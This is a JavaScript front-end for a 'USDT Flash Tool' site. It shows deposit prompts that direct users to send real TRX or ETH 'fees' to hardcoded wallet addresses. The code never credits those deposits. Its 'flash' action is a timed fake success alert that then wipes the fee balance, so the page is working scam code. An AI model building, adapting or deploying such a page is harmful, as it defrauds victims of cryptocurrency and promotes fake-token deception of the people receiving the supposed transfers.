// Wait until the DOM is fully loaded before running the script
document.addEventListener('DOMContentLoaded', () => {
    console.log("DOM fully loaded. Initializing USDT Flash Tool script.");

    // --- Elements ---
    const overlay = document.getElementById('universalModalOverlay');
    const modalContent = document.getElementById('universalModalContent');
    const addTronBtn = document.getElementById('addTronFeeBtn');
    const addEthBtn = document.getElementById('addEthFeeBtn');
    const flashButton = document.getElementById('flashButton');
    const recipientInput = document.getElementById('recipient');
    const networkSelect = document.getElementById('network');
    const amountInput = document.getElementById('amount');
    const processingSection = document.getElementById('processingSection');
    const tronBalanceDisplay = document.getElementById('tron-balance-display');
    const ethBalanceDisplay = document.getElementById('eth-balance-display');
    const copiedPopup = document.getElementById('copied-popup');
    const successPopup = document.getElementById('success-popup');
    const depositStatusElement = document.getElementById('deposit-status');
    const maxFlashInfoElement = document.getElementById('max-flash-info');
    // Login elements
    const authLinksDiv = document.getElementById('auth-links');
    const userSessionDiv = document.getElementById('user-session');
    const usernameDisplaySpan = document.getElementById('username-display');
    const logoutButton = document.getElementById('logout-button');

    console.log("Checking essential elements...");
    // --- Check if essential elements exist ---
    const essentialElements = {
        overlay, modalContent, addTronBtn, addEthBtn, flashButton, recipientInput,
        networkSelect, amountInput, processingSection, tronBalanceDisplay,
        ethBalanceDisplay, copiedPopup, successPopup, depositStatusElement, maxFlashInfoElement,
        authLinksDiv, userSessionDiv, usernameDisplaySpan, logoutButton
    };
    let allElementsFound = true;
    for (const key in essentialElements) {
        if (!essentialElements[key]) {
            console.error(`Initialization Error: Element with ID '${key}' not found.`);
            allElementsFound = false;
        }
    }
    if (!allElementsFound) {
         alert(`Initialization Error: One or more critical page elements are missing. The tool cannot start.`);
         return;
    }
     console.log("All essential elements found.");

    // --- State & Configuration ---
    let currentTronBalance = 0.00;
    let currentEthBalance = 0.00;
    let isViewingDepositInfo = false; // Tracks if deposit modal is open
    let maxFlashAmount = 0;

    const WALLET_MAX_FLASH = 100000000;
    const MIN_FLASH_AMOUNT = 1000;
    const FEE_PER_UNIT_FLASH = 50;
    const FLASH_UNIT_AMOUNT = 1000;
    const TRX_PER_USD = 4.10;
    const ETH_PER_USD = 0.00044;
    const MIN_DEPOSIT_USD = 50;
    const MAX_DEPOSIT_USD = 5000;
    // --- MODIFIED ADDRESSES ---
    const TRON_DEPOSIT_ADDRESS = "TPowMg7Jd3DpwDggkoSzxuTU8pGTksdua8";
    const ETHEREUM_DEPOSIT_ADDRESS = "0x374756d81ccc0f8cad4e0863bb96ad5e1579f9cc";
    // --- END MODIFIED ADDRESSES ---

    const NETWORK_DETAILS = {
        tron: { key: "tron", name: "Tron (TRC20)", ticker: "TRX", address: TRON_DEPOSIT_ADDRESS, iconClass: "tron-icon", rate: TRX_PER_USD, qrPrefix: "tron:", minFee: 0.5, cryptoPrecision: 6 },
        ethereum: { key: "ethereum", name: "Ethereum (ERC20)", ticker: "ETH", address: ETHEREUM_DEPOSIT_ADDRESS, iconClass: "eth-icon", rate: ETH_PER_USD, qrPrefix: "ethereum:", minFee: 5.0, cryptoPrecision: 8 }
    };

    // --- UI Update Function based on Login State ---
    function updateLoginStateUI() {
        const loggedInUsername = localStorage.getItem('loggedInUser');
        if (loggedInUsername) {
            if (usernameDisplaySpan) usernameDisplaySpan.textContent = loggedInUsername;
            if (userSessionDiv) userSessionDiv.style.display = 'block';
            if (authLinksDiv) authLinksDiv.style.display = 'none';
            console.log(`User '${loggedInUsername}' is logged in.`);
        } else {
            if (usernameDisplaySpan) usernameDisplaySpan.textContent = '';
            if (userSessionDiv) userSessionDiv.style.display = 'none';
            if (authLinksDiv) authLinksDiv.style.display = 'block';
            console.log("User is logged out.");
        }
        checkFlashButtonEligibility();
    }

    // --- Utility Functions ---
    function showModal(content) { if (!modalContent || !overlay) return; modalContent.innerHTML = content; overlay.style.display = 'flex'; void overlay.offsetWidth; overlay.classList.add('show'); isViewingDepositInfo = true; checkFlashButtonEligibility(); console.log("Modal shown."); }
    function hideModal() { if (!modalContent || !overlay) return; overlay.classList.remove('show'); isViewingDepositInfo = false; checkFlashButtonEligibility(); const t = 300; setTimeout(() => { if (!overlay.classList.contains('show')) { overlay.style.display = 'none'; modalContent.innerHTML = ''; } }, t); console.log("Modal hidden."); }
    function showPopup(element) { if (!element) { console.warn("Popup element null."); return; } document.querySelectorAll('.popup.show').forEach(p => p.classList.remove('show')); element.classList.add('show'); setTimeout(() => { element.classList.remove('show'); }, 2500); }
    async function copyToClipboard(text) { try { if (!navigator.clipboard) { console.warn("Using fallback clipboard."); const ta=document.createElement("textarea"); ta.value=text; ta.style.position="fixed"; ta.style.top="-9999px"; ta.style.left="-9999px"; document.body.appendChild(ta); ta.focus(); ta.select(); let s=false; try{s=document.execCommand('copy');}catch(e){console.error('Fallback copy failed:',e);throw e;}finally{document.body.removeChild(ta);} if(s){showPopup(copiedPopup);console.log("Copied (fallback).");return;}else{throw new Error('Fallback failed.');}} else {await navigator.clipboard.writeText(text);showPopup(copiedPopup);console.log("Copied (async).");}} catch(e){console.error('Copy failed: ',e);alert('Could not copy. Please copy manually.');throw e;}}
    function formatNumber(num, digits = 0) { const n = Number(num); return isNaN(n) ? 'N/A' : n.toLocaleString('en-US', { maximumFractionDigits: digits }); }
    function updateBalanceDisplay() { if (!tronBalanceDisplay || !ethBalanceDisplay) return; tronBalanceDisplay.textContent = `$${currentTronBalance.toFixed(2)}`; ethBalanceDisplay.textContent = `$${currentEthBalance.toFixed(2)}`; updateMaxFlashAmountDisplay(); checkFlashButtonEligibility(); }
    function calculateMaxFlashAmount() {
        if (!networkSelect) return 0;
        const k = networkSelect.value === "TRC20" ? "tron" : "ethereum";
        const c = NETWORK_DETAILS[k];
        if (!c) return 0;
        const b = k === "tron" ? currentTronBalance : currentEthBalance;
        const minNetworkFee = c.minFee || 0;

        if (b < minNetworkFee) {
            //console.log(`Balance $${b.toFixed(2)} below min network fee $${minNetworkFee.toFixed(2)} for ${k}`);
            return 0;
        }
        const feeForMinFlash = (MIN_FLASH_AMOUNT / FLASH_UNIT_AMOUNT) * FEE_PER_UNIT_FLASH;
        if (b < feeForMinFlash) {
             //console.log(`Balance $${b.toFixed(2)} below fee for min flash $${feeForMinFlash.toFixed(2)}`);
             return 0;
        }
        const affordableUnits = Math.floor(b / FEE_PER_UNIT_FLASH);
        const potentialFlashAmount = affordableUnits * FLASH_UNIT_AMOUNT;
        if (potentialFlashAmount < MIN_FLASH_AMOUNT) {
             //console.log(`Calculated potential flash ${potentialFlashAmount} is below minimum ${MIN_FLASH_AMOUNT}`);
             return 0;
        }
        const maxFlash = Math.min(potentialFlashAmount, WALLET_MAX_FLASH);
        //console.log(`Calculated max flash for ${k}: ${maxFlash} USDT (Balance: $${b.toFixed(2)})`);
        return maxFlash;
    }
    function updateMaxFlashAmountDisplay() { if (!maxFlashInfoElement || !amountInput) return; maxFlashAmount = calculateMaxFlashAmount(); const ff = formatNumber(FEE_PER_UNIT_FLASH, 0); const fu = formatNumber(FLASH_UNIT_AMOUNT, 0); const fm = formatNumber(MIN_FLASH_AMOUNT, 0); const fmx = formatNumber(maxFlashAmount, 0); maxFlashInfoElement.innerHTML = `Max flashable (<span class="text-teal-400">$${ff}</span> fee per <span class="text-teal-400">${fu} USDT</span>): <span id="max-flash-amount-display" class="font-semibold text-teal-400">${fmx} USDT</span>`; amountInput.placeholder = `Min ${fm} / Max ${fmx}`; amountInput.max = maxFlashAmount > 0 ? maxFlashAmount : '';
        amountInput.min = MIN_FLASH_AMOUNT; }

    function checkFlashButtonEligibility() {
        if (!flashButton) return;
        if (isViewingDepositInfo) {
            flashButton.title = "Close the deposit window first.";
            flashButton.classList.add('opacity-50', 'cursor-not-allowed');
        } else {
            const currentMaxFlashCalculated = calculateMaxFlashAmount();
            let reason = 'Initiate USDT Flash Transaction';
            if (currentMaxFlashCalculated < MIN_FLASH_AMOUNT) {
                 reason = "Insufficient fee balance to initiate flash.";
            }
            flashButton.title = reason;
            flashButton.classList.remove('opacity-50', 'cursor-not-allowed');
        }
         //console.log("checkFlashButtonEligibility called. isViewingDepositInfo:", isViewingDepositInfo, "Title:", flashButton.title);
    }

    function generateQrCode(data, id) { const cont = document.getElementById(id); if (!cont) { console.error('QR Container not found:', id); return; } cont.innerHTML = ''; try { if (typeof QRCodeStyling === 'undefined') { console.error("QR lib not loaded."); cont.textContent = "Error: QR lib failed."; cont.style.color = 'var(--error-color)'; return; } /*console.log("Generating QR:", data);*/ const qr = new QRCodeStyling({ width: 150, height: 150, type: 'svg', data: data, dotsOptions: { color: "#000", type: "dots" }, backgroundOptions: { color: "#fff" }, cornersSquareOptions: { type: "extra-rounded", color: "var(--primary-color)" }, cornersDotOptions: { type: "dot", color: "var(--primary-color)" }, qrOptions: { errorCorrectionLevel: 'M' }, imageOptions: { hideBackgroundDots: true, imageSize: 0.4, margin: 4 } }); qr.append(cont); /*console.log("QR generated.");*/ } catch (e) { console.error("QR generation error:", e); cont.textContent = "Failed to generate QR."; cont.style.color = 'var(--error-color)'; } }
    function createConfirmationHtml(nk) { const d = NETWORK_DETAILS[nk]; if (!d) return '<p class="text-red-500 p-4">Error: Unknown Network Key.</p>'; const pt = `Min $${MIN_DEPOSIT_USD.toFixed(2)} - Max $${MAX_DEPOSIT_USD.toFixed(2)}`; return `<div class="modal-header"><span class="modal-icon-placeholder ${d.iconClass}"></span><span>Deposit ${d.ticker} Fee</span></div><div class="modal-body"><p class="mb-4 text-sm text-gray-400">Enter amount in USD ($) for ${d.name} fees. Min deposit is <strong>$${MIN_DEPOSIT_USD.toFixed(2)}</strong>.</p><label for="depositUsdAmountInput">Amount in USD</label><input type="number" id="depositUsdAmountInput" name="usd_amount" min="${MIN_DEPOSIT_USD}" max="${MAX_DEPOSIT_USD}" placeholder="${pt}" step="0.01" required class="w-full bg-gray-800 border border-gray-600 rounded-lg p-3 text-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-teal-400"><p id="modal-error-message" class="modal-error"></p></div><hr class="modal-separator"><div class="modal-actions"><button class="modal-button proceed-btn" data-action="proceedDeposit" data-network="${nk}">Show Deposit Info</button><button class="modal-button close-modal-btn" data-action="close">Cancel</button></div>`; }
    function createDepositScreenHtml(nk, ua, ca, da) { const d = NETWORK_DETAILS[nk]; if (!d) return '<p class="text-red-500 p-4">Error: Network data missing.</p>'; const nn = d.name; const t = d.ticker; const us = `$${ua.toFixed(2)}`; const cf = ca.toFixed(d.cryptoPrecision); const qd = `${d.qrPrefix}${da}?amount=${cf}`; /*console.log("QR Data:", qd);*/ return `<div class="deposit-screen-content"><h2 class="text-xl font-semibold mb-4 text-center text-teal-400">Deposit ${t} for Fees</h2><p class="text-sm text-gray-400 mb-4 text-left">To add <strong>${us}</strong> to your ${nn} fee balance, send <strong>exact crypto amount</strong> below:</p><div class="deposit-info-line"><strong class="label">Amount:</strong><span class="value crypto-amount text-lg text-teal-300">${cf} ${t}</span></div><div class="deposit-info-line items-start"><span class="icon-placeholder ${d.iconClass} icon mt-1"></span><strong class="label">To Address (${nn}):</strong><div class="flex-grow break-all mr-2"><span class="value text-sm" id="deposit-address-text">${da}</span></div><button class="copy-button ml-auto flex-shrink-0" data-clipboard-text="${da}" title="Copy Address"><i class="fas fa-copy text-xs"></i> <span class="copy-button-text text-xs">Copy</span></button></div><div class="qr-section"><p class="text-sm mb-2">Scan QR Code (check amount):</p><div class="qr-code-container" id="qr-code-container"><p class="text-gray-500 text-xs py-4">Generating QR...</p></div><p class="text-xs mt-2 text-gray-500">Send only ${t} (${nn}). Other assets may be lost.</p></div><div class="deposit-note"><i class="fas fa-info-circle mr-2"></i><strong> Note:</strong> Balance updates require verification after deposit. You can close this window.</div><div class="modal-actions mt-5"><button class="modal-button close-modal-btn" data-action="closeDepositWindow">Close Window</button></div></div>`; }

    // --- Event Listeners Setup ---
    function handleAddFeeClick(e) {
        const b = e.target.closest('button.add-button'); if (!b) return;
        if (isViewingDepositInfo) return;
        const nk = b.dataset.network; if (!NETWORK_DETAILS[nk]) { console.error("Invalid network key:", nk); alert("Internal error: Invalid network."); return; }
        console.log(`Add fee clicked for: ${nk}`); showModal(createConfirmationHtml(nk));
        if(addTronBtn) addTronBtn.disabled = true;
        if(addEthBtn) addEthBtn.disabled = true;
    }
    if (addTronBtn) addTronBtn.addEventListener('click', handleAddFeeClick);
    if (addEthBtn) addEthBtn.addEventListener('click', handleAddFeeClick);

    if (modalContent) {
        modalContent.addEventListener('click', (e) => {
            const tb = e.target.closest('button[data-action], button[data-clipboard-text]'); if (!tb) return;
            const act = tb.dataset.action; const ct = tb.dataset.clipboardText;

            if (act === 'close' || act === 'closeDepositWindow') {
                hideModal();
                if(addTronBtn) addTronBtn.disabled = false;
                if(addEthBtn) addEthBtn.disabled = false;
                console.log("Deposit window closed.");
            } else if (act === 'proceedDeposit') {
                console.log("Proceed Deposit clicked.");
                const ai = document.getElementById('depositUsdAmountInput');
                const er = document.getElementById('modal-error-message');
                const pb = tb;
                const nk = pb.dataset.network;
                if (!ai || !er || !pb || !nk || !NETWORK_DETAILS[nk]) { console.error("Deposit modal elements missing/invalid."); alert("Error preparing deposit."); hideModal(); return; }
                const ua = parseFloat(ai.value);
                er.textContent = ''; er.classList.remove('show'); ai.style.borderColor = '';
                if (isNaN(ua) || ua < MIN_DEPOSIT_USD || ua > MAX_DEPOSIT_USD) {
                    er.textContent = `Amount must be between $${MIN_DEPOSIT_USD.toFixed(2)} and $${MAX_DEPOSIT_USD.toFixed(2)}.`;
                    er.classList.add('show'); ai.style.borderColor = 'var(--error-color)'; ai.focus();
                    console.warn("Deposit validation failed:", ai.value); return;
                }
                const d = NETWORK_DETAILS[nk]; const ca = ua * d.rate; const da = d.address;
                modalContent.innerHTML = createDepositScreenHtml(nk, ua, ca, da);
                requestAnimationFrame(() => {
                    const qc = 'qr-code-container'; const q = document.getElementById(qc);
                    if (q) { const qd = `${d.qrPrefix}${da}?amount=${ca.toFixed(d.cryptoPrecision)}`; generateQrCode(qd, qc); }
                    else { console.error(`QR container #${qc} not found.`); const qe = document.getElementById(qc); if(qe) qe.innerHTML = `<p style="color: var(--error-color);">Error displaying QR.</p>`; }
                });
                console.log(`Deposit screen shown for ${nk}. NO automatic confirmation implemented.`);

            } else if (ct) {
                console.log(`Copy clicked: ${ct}`);
                copyToClipboard(ct).then(() => {
                    const cb=tb; const cbt=cb.querySelector('.copy-button-text'); const ot=cbt?cbt.textContent:'Copy';
                    if(cbt){cbt.textContent='Copied!';} else {cb.textContent='Copied!';}
                    cb.style.opacity=0.7;
                    setTimeout(()=>{
                        const currentButton = modalContent.querySelector(`button[data-clipboard-text="${ct}"]`);
                        if(currentButton){
                             const currentButtonText = currentButton.querySelector('.copy-button-text');
                             if(currentButtonText) {currentButtonText.textContent = ot;} else {currentButton.textContent=ot;}
                             currentButton.style.opacity = 1;
                        }
                    }, 1500);
                }).catch(err => { console.error("Copy failed:", err); });
            }
        });
    }

    if (overlay) {
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) {
                console.log("Overlay clicked, hiding.");
                hideModal();
                if(addTronBtn) addTronBtn.disabled = false;
                if(addEthBtn) addEthBtn.disabled = false;
            }
        });
    }

    if (networkSelect) { networkSelect.addEventListener('change', () => { console.log(`Network changed: ${networkSelect.value}`); updateMaxFlashAmountDisplay(); checkFlashButtonEligibility(); const nk = networkSelect.value === 'TRC20' ? 'tron' : 'ethereum'; const nc = NETWORK_DETAILS[nk]; if (nc && recipientInput) { recipientInput.placeholder = `Enter recipient ${nc.name} address`; } else if (recipientInput) { recipientInput.placeholder = `Enter recipient address`; } }); }
    if (logoutButton) { logoutButton.addEventListener('click', (e) => { e.preventDefault(); console.log("Logout clicked."); try { localStorage.removeItem('loggedInUser'); console.log("Logged out state cleared."); updateLoginStateUI(); alert("You have been logged out."); } catch (er) { console.error("Logout error:", er); alert("Logout error."); } }); }

    // --- Flash Button Click Listener ---
    if (flashButton) {
        flashButton.addEventListener('click', () => {
            console.log("Flash USDT button clicked.");
            if (isViewingDepositInfo) { alert("❌ Cannot Flash.\n\nPlease close the deposit information window first."); console.warn("Flash blocked: Deposit info modal open."); return; }

            // --- Fee Check ---
            const currentMaxFlashCalculated = calculateMaxFlashAmount();
            if (currentMaxFlashCalculated < MIN_FLASH_AMOUNT) {
                alert("Cannot generate flash until fee deposit is verified."); // English translation
                console.warn("Flash blocked: Insufficient fees for minimum flash amount.");
                return;
            }

            const recipient = recipientInput.value.trim(); const amountStr = amountInput.value.trim(); const amount = parseFloat(amountStr);
            if (!recipient || !amountStr || isNaN(amount) || amount <= 0) { alert("⚠️ Please enter a valid Recipient Address and Amount to Flash."); console.warn("Flash validation failed: Missing address or amount."); if (!recipient) recipientInput.focus(); else if (!amountStr || isNaN(amount) || amount <= 0) amountInput.focus(); return; }

            if (amount > currentMaxFlashCalculated) {
                 alert(`⚠️ Requested amount (${formatNumber(amount, 0)} USDT) exceeds the maximum allowed (${formatNumber(currentMaxFlashCalculated, 0)} USDT) based on your current fee balance.`);
                 console.warn(`Flash blocked: Amount ${amount} exceeds calculated max ${currentMaxFlashCalculated}`);
                 amountInput.focus();
                 return;
            }

            const networkKey = networkSelect.value === "TRC20" ? "tron" : "ethereum";
            const networkConfig = NETWORK_DETAILS[networkKey];

            let validationErrors = []; let addressValid = false;
            if (networkKey === "tron" && recipient.startsWith('T') && recipient.length === 34) addressValid = true; else if (networkKey === "ethereum" && recipient.match(/^0x[a-fA-F0-9]{40}$/)) addressValid = true;
            if (!addressValid) validationErrors.push(`Invalid or unsupported ${networkConfig.name} address format.`);
            if (amount < MIN_FLASH_AMOUNT) { validationErrors.push(`Minimum flash amount is ${formatNumber(MIN_FLASH_AMOUNT, 0)} USDT.`); }
            if (amount > WALLET_MAX_FLASH) { validationErrors.push(`Amount exceeds the overall tool limit (${formatNumber(WALLET_MAX_FLASH, 0)} USDT).`); }

            if (validationErrors.length > 0) { alert("⚠️ Please fix the following issues:\n\n- " + validationErrors.join("\n- ")); console.warn("Flash validation failed:", validationErrors); return; }

            console.log(`Validation passed. Initiating flash send.`); if(processingSection) processingSection.classList.add('show'); flashButton.classList.add('opacity-50', 'cursor-not-allowed'); flashButton.textContent = 'SENDING...'; if(recipientInput) recipientInput.disabled = true; if(amountInput) amountInput.disabled = true; if(networkSelect) networkSelect.disabled = true;
            setTimeout(() => {
                if(processingSection) processingSection.classList.remove('show'); flashButton.textContent = 'FLASH USDT'; flashButton.classList.remove('opacity-50', 'cursor-not-allowed'); if(recipientInput) recipientInput.disabled = false; if(amountInput) amountInput.disabled = false; if(networkSelect) networkSelect.disabled = false;

                alert(`✅ Flash Sent Successfully!\n\nAmount: ${formatNumber(amount, 0)} USDT\nNetwork: ${networkKey}\nRecipient: ${recipient}`);

                console.log(`Consuming fee balance for ${networkKey}.`);
                if (networkKey === 'tron') {
                    currentTronBalance = 0.00;
                } else if (networkKey === 'ethereum') {
                    currentEthBalance = 0.00;
                }
                console.log("Fee balance reset to $0.00 for the used network.");
                updateBalanceDisplay();

                console.log("Flash transaction complete. UI reset."); if(recipientInput) recipientInput.value = ''; if(amountInput) amountInput.value = ''; checkFlashButtonEligibility();
            }, 2500);
        });
    }

    // --- Initial Setup Calls ---
    console.log("Running initial page setup..."); updateBalanceDisplay(); if (networkSelect) { networkSelect.dispatchEvent(new Event('change')); } else { console.warn("Network select element not found during init."); } updateLoginStateUI(); console.log("Initial setup complete. USDT Flash Tool ready.");

    // Note: Manual balance update mechanism is not implemented in this script.

}); // End of DOMContentLoaded listener
console.log("USDT Script parsed successfully.");